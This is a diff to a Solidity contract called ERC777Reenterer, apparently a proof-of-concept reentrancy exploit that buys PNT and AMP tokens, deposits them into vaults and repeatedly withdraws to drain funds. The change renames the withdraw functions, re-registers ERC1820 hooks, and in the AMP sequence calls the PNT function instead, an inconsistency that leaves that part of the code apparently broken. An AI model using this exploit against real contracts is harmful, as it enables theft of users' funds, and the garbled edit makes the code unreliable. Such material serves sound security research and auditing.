@@ -33,12 +33,12 @@ contract ERC777Reenterer {
 
     constructor(address _pntVault, address _ampVault) {
         _ERC1820_REGISTRY.setInterfaceImplementer(
-            address(0),
+            address(this),
             _TOKENS_RECIPIENT_INTERFACE_HASH,
             address(this)
         );
         _ERC1820_REGISTRY.setInterfaceImplementer(
-            address(0),
+            address(this),
             _AMP_INTERFACE_HASH,
             address(this)
         );       
@@ -59,11 +59,11 @@ contract ERC777Reenterer {
         ampVault.deposit(amp.balanceOf(address(this)));
     }
 
-    function doPntDiluteCycle() public  {
+    function doPntReentrant() public  {
         pntVault.withdraw(pntVault.balanceOf(address(this)));
     }
 
-    function doAmpDiluteCycle() public  {
+    function doAmpReentrant() public  {
         ampVault.withdraw(ampVault.balanceOf(address(this)));
     }
 
@@ -104,18 +104,18 @@ contract ERC777Reenterer {
 
         _buyWithEth(pntAddr, 100 ether, address(this));
         depositPnt();
-        doPntDiluteCycle();
-        doPntDiluteCycle();
-        doPntDiluteCycle();
-        doPntDiluteCycle();
+        doPntReentrant();
+        doPntReentrant();
+        doPntReentrant();
+        doPntReentrant();
         cashOutPnt();
 
         _buyWithEth(ampAddr, 100 ether, address(this));
         depositAmp();
-        doAmpDiluteCycle();
-        doAmpDiluteCycle();
-        doAmpDiluteCycle();
-        doAmpDiluteCycle();
+        doPntReentrant();
+        doPntReentrant();
+        doPntReentrant();
+        doPntReentrant();
         cashOutAmp();
     }
 
